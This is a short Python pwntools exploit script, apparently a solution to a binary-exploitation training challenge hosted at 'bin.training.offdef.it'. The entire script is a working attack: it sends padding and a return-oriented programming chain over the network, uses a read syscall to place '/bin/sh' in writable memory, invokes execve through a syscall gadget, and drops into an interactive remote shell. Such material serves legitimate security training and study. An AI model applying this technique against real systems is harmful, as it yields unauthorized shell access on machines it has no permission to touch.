from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']
r = remote("bin.training.offdef.it", 2015)

# gdb.attach(r, """
#            # b *0x040021f
#            c
#            """)
input("wait")

a=0x1
b=0x2
#r.send(b"\x01\x00\x00\x00\x00\x00\x00\x00")

def halfonstack(value):
    r.send(pwnlib.util.packing.p32(value))
    r.send(pwnlib.util.packing.p32(0))

def onstack(value):
    onehalf = value & 0xffffffff
    otherhalf = value >> 32

    halfonstack(onehalf)
    halfonstack(otherhalf)

pop_rdi_rsi_rdx_rax = 0x04001c2
read = 0x0400144
binsh = 0x600500
syscall = 0x0400168

chain = [0x0]*7
chain += [
    pop_rdi_rsi_rdx_rax,
    0, #rdi -> file descriptor
    binsh, #rsi -> buffer ->bss always writable -> look in gdb with vmmap
    8, #rdx -> num of bytes
    0, #rax -> count
    read, #we need a syscall that is doing a ret -> f.i. read
    pop_rdi_rsi_rdx_rax,
    binsh, #rdi
    0, #rsi
    0, #rdx
    0x3b, #rax
    syscall
]


for i in chain:
    onstack(i)


r.send("\n")
time.sleep(0.1)
r.send("\n")
time.sleep(0.1)

r.send("/bin/sh\x00")

r.interactive()